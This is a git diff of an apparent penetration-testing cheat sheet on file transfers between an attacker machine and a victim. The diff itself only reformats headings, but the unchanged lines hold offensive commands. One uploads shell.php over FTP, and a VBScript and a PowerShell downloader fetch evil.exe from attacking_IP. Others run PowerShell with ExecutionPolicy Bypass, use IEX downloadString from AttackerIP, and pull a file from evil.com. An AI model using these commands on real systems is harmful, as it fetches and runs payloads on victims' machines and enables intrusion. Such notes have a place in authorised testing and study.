@@ -1,6 +1,6 @@
 # File Transfers
 
-  Potential tools that can be used:
+Potential tools that can be used:
 
 -  wget
 -  Python Simple Server Module 
@@ -12,19 +12,19 @@
 -  [satellite](https://github.com/t94j0/satellite)
 -  [pwndrop](https://github.com/kgretzky/pwndrop)
 
-### FTP
+## FTP
 
 If you have FTP access, you can try "putting" a file:
 
 `ftp> put shell.php`
 
-### Simple HTTP Server with Python
+## Simple HTTP Server with Python
 
 Turn current (kali) directory into a webserver (won't have to copy to /var/www/html):
 
 `$ python -m SimpleHTTPServer <port#>`
 
-### Impacket SMB Server
+## Impacket SMB Server
 
 Attacking machine:
 
@@ -40,11 +40,11 @@ PS C:\> cd GetchShare:
 PS GetchShare:\> echo "tada!"
 ```
 
-### Python SMTP Server
+## Python SMTP Server
 
 `$ sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25`
 
-### wget.vbs:
+## wget.vbs:
 
 ```shell
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -78,7 +78,7 @@ echo ts.Close >> wget.vbs
 
 `C:\Users\Victim>cscript wget.vbs [http://attacking_IP/evil.exe](http://attacking_IP/evil.exe) evil.exe`
 
-### wget.ps1
+## wget.ps1
 
 ```powershell
 echo $storageDir = $pwd > wget.ps1
@@ -92,7 +92,7 @@ echo $webclient.DownloadFile($url,$file) >>wget.ps1
 
 `C:\Users\Victim>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`
 
-### Downloading from PowerShell:
+## Downloading from PowerShell:
 
 `PS C:\Users\Victim> IEX(New-Object Net.WebClient).downloadString('http://AttackerIP:port/FileToDownload.exe')`
 
@@ -108,7 +108,7 @@ or
 
 `PS C:\Users\Victim> Invoke-WebRequest -Uri https://evil.com/evil.exe -OutFile evil.exe`
 
-### Nc
+## Nc
 
 On the receiving end, running...
 
